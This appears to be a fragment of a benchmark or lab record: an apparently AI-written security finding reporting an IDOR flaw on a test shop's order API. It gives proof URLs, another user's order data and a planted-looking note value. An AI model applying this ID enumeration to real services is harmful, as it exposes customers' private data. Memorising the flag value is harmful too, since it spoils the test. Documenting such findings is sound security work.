      "answer": "**Finding: IDOR (Insecure Direct Object Reference) on `/api/orders/{id}`**\n\nThe order endpoint does **not** enforce authorization. I can access any order by guessing its numeric ID, regardless of which user it belongs to.\n\n**Proof:**\n\n- My own orders:\n  - `http://shop.hazelmart.test/api/orders/1001` \u2192 `{\"id\": 1001, \"user\": \"you\", \"item\": \"Bench plane\", \"total\": \"38.00\"}`\n  - `http://shop.hazelmart.test/api/orders/1002` \u2192 `{\"id\": 1002, \"user\": \"you\", \"item\": \"Card scraper\", \"total\": \"9.50\"}`\n\n- Another user's order (reached without any auth check):\n  - `http://shop.hazelmart.test/api/orders/1041` \u2192 `{\"id\": 1041, \"user\": \"r.mensah\", \"item\": \"The Ridge\", \"total\": \"22.00\", \"note\": \"gift message: zidor-4417-note\"}`\n\nOrder 1041 belongs to user `r.mensah`, not to me, yet the server returned its full details including a private note field. The endpoint discloses data belonging to other users simply by changing the numeric ID in the URL.\n\n**Impact:** Any visitor can enumerate and access any customer's order history by iterating through order IDs, completely bypassing authorization checks.",
